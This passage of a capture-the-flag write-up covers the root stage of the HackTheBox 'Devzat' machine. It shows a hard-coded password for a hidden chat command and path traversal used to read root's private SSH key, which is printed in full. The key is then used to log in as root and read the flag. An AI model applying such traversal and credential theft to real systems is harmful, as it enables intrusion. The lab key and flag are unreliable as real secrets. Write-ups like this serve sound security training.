+-rw-r--r-- 1 root root  5630 Jun 22 13:35 README.md
+-rwxr-xr-x 1 root root   123 Jun 22 13:35 start.sh
+-rw-r--r-- 1 root root  8715 Jun 22 13:35 util.go
+```
+
+I use a site called `text-compare.com` for good presentation in `writeup`. you also use `diff` command but i don't use that because it's `mess` the output.
+
+Link : https://text-compare.com/
+
+First `change` we see it's import the `path/filepath`.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-devzat-writeup' />
+
+Second we see it's `add` a new command called `/file` and for using that command we need `password` which is hard-coded inside the `program` and we also see that if `path` not found it's `print the current path` were the program running.
+
+password = `CeilingCatStillAThingIn2021?`
+
+<FixTheImageURL src='web7.png' slug='hackthebox-devzat-writeup' />
+
+And inside `devchat.go` file we see it's running on port `8443`.
+
+<FixTheImageURL src='cmd9.png' slug='hackthebox-devzat-writeup' />
+
+Now let's `connect` to the port with any `user`.
+
+And we see when we give `wrong path` it's print the current path `/root/devzat`.
+
+```js
+catherine@devzat:~$ ssh -l dedsec localhost -p 8443
+The authenticity of host '[localhost]:8443 ([127.0.0.1]:8443)' can't be established.
+ED25519 key fingerprint is SHA256:liAkhV56PrAa5ORjJC5MU4YSl8kfNXp+QuljetKw0XU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[localhost]:8443' (ED25519) to the list of known hosts.
+Welcome to the chat. There are no more users
+devbot: dedsec has joined the chat
+dedsec: /file /root/root.txt CeilingCatStillAThingIn2021?
+[SYSTEM] The requested file @ /root/devzat/root/root.txt does not exist!
+dedsec:
+```
+
+Now let's `try` to get the root `id_rsa` file.
+
+```js
+dedsec: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
+[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
+[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
+[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
+[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
+[SYSTEM] -----END OPENSSH PRIVATE KEY-----
+dedsec:
+```
+
+Let's `clean` the id_rsa of `root`.
+
+## id_rsa_root
+
+```js
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
+HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
+AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
+Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Now let's `ssh` in and get the `root.txt` file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ chmod 600 id_rsa_root
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ ssh -i id_rsa_root root@10.10.11.118
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/advantage
+
+    System information as of Thu 21 Oct 2021 06:29:49 AM UTC
+
+    System load:  0.0               Processes:                244
+    Usage of /:   59.3% of 7.81GB   Users logged in:          1
+    Memory usage: 38%               IPv4 address for docker0: 172.17.0.1
+    Swap usage:   0%                IPv4 address for eth0:    10.10.11.118
+
+
+107 updates can be applied immediately.
+33 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Oct 11 14:28:01 2021
+root@devzat:~# cat root.txt
+87b4dd4efa0d99b872ed137ec0d7a6e2
+root@devzat:~#
+```
